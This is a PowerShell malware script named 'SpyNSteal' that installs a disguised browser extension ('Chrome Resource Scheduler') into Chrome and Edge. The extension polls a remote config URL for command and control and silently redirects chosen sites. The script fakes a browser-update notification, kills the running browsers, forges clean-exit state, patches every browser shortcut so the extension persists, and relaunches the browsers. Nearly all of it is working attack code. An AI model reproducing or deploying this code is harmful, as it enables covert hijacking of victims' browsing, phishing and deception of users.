# SpyNSteal - Extension Loader
# Writes extension to a persistent directory, modifies Chrome shortcuts,
# and uses --load-extension for reliable loading without Secure Preferences forgery.

$EXT_ID = "egiajcmnnojdmgcdgkojldgdihcjimhi"

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9E4l4ZNccXGXQ0vwNIaT8IV8Jo1eqoOmZW2pJFZcrFIyC1oobcmN7ReASmGHHV4EHM+NdUF3GWqouQ/xeQEsLHO4/z1K8D5ZauoMLV5IjBVjtBtv358t5t9hxWk10nv+MFaCx5JW3w+iZFvYQKNNMP0zw6G6+qGAH9f7s49Hg4Od9aFG0A3zkRlQ5JlYQ2e+8mulWe6Ps9GK3Lsw7MsT5i83c0gH2ioOuWCZoR0Uq0wZ3sAng4de6HXwmO/U6CiHMhQBtPB8R6oFCalIOTfleqYXSrCdKqZQ6d8/4EcDzq4g/N7y7X/qms6RUBQ+qp7oN/rxEnhqFeOyhYYOSj7T2QIDAQAB",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "%%CONFIG_URL%%";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

$ExtDirName = "CRSched"

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)

    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $candidate = Join-Path $d "$($info.Proc).exe"
            if ($name -eq "chrome") { $candidate = Join-Path $d "chrome.exe" }
            if (Test-Path $candidate) { $info.ExePath = $candidate; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            if (-not $ls.profile.PSObject.Properties["exited_cleanly"]) {
                $ls.profile | Add-Member -NotePropertyName "exited_cleanly" -NotePropertyValue $true
            } else { $ls.profile.exited_cleanly = $true }
            if (-not $ls.profile.PSObject.Properties["exit_type"]) {
                $ls.profile | Add-Member -NotePropertyName "exit_type" -NotePropertyValue "Normal"
            } else { $ls.profile.exit_type = "Normal" }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else {
            $n.Icon = [Drawing.SystemIcons]::Information
        }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Patch-Shortcut([string]$lnkPath, [string]$extDir) {
    if (-not (Test-Path $lnkPath)) { return $false }
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut($lnkPath)
        $loadArg = "--load-extension=`"$extDir`""
        if ($lnk.Arguments -notlike "*--load-extension*") {
            if ($lnk.Arguments) {
                $lnk.Arguments = $lnk.Arguments + " " + $loadArg
            } else {
                $lnk.Arguments = $loadArg
            }
            $lnk.Save()
            return $true
        }
    } catch {}
    return $false
}

# ============================================================================
#  MAIN
# ============================================================================

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) { $ts = Get-Date -Format 'HH:mm:ss'; Add-Content $LOG "$ts  $msg" }
Log "=== SpyNSteal v3 (load-extension) ==="

# 1 - Write extension to persistent directory
$extDir = Join-Path $env:APPDATA $ExtDirName
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension written to: $extDir"

# 2 - Find browsers
$browsers = @()
foreach ($name in @("chrome", "edge")) {
    $b = Find-Browser $name
    Log "Browser '$name': Found=$($b.Found) Running=$($b.Running) ExePath=$($b.ExePath)"
    if ($b.Found) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers found"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }

# 3 - Show notification and kill running browsers
if ($wasRunning.Count -gt 0) {
    Show-UpdateNotif $wasRunning[0]
    foreach ($b in $wasRunning) {
        try { [Diagnostics.Process]::GetProcessesByName($b.Proc) | ForEach-Object { $_.Kill() } } catch {}
    }
    Start-Sleep 2
    foreach ($b in $wasRunning) {
        for ($w = 0; $w -lt 15; $w++) {
            if (-not (Get-Process $b.Proc -EA SilentlyContinue)) { break }
            Start-Sleep 1
        }
    }
}

foreach ($b in $wasRunning) { Patch-LocalState $b.UserData }

# 4 - Patch all Chrome/Edge shortcuts to include --load-extension
$shortcutPaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk",
    "$env:USERPROFILE\Desktop\Google Chrome.lnk",
    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk",
    "$env:USERPROFILE\Desktop\Microsoft Edge.lnk",
    "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk",
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk"
)
$patched = 0
foreach ($s in $shortcutPaths) {
    if (Patch-Shortcut $s $extDir) {
        Log "Patched shortcut: $s"
        $patched++
    }
}
Log "Shortcuts patched: $patched"

# 5 - Relaunch with --load-extension for this session
Start-Sleep 1
foreach ($b in $wasRunning) {
    if ($b.ExePath -and (Test-Path $b.ExePath)) {
        $args = "--restore-last-session --load-extension=`"$extDir`""
        Log "Launching: $($b.ExePath) $args"
        try { Start-Process $b.ExePath $args } catch { Log "Launch error: $_" }
    }
}

Log "=== Done ==="
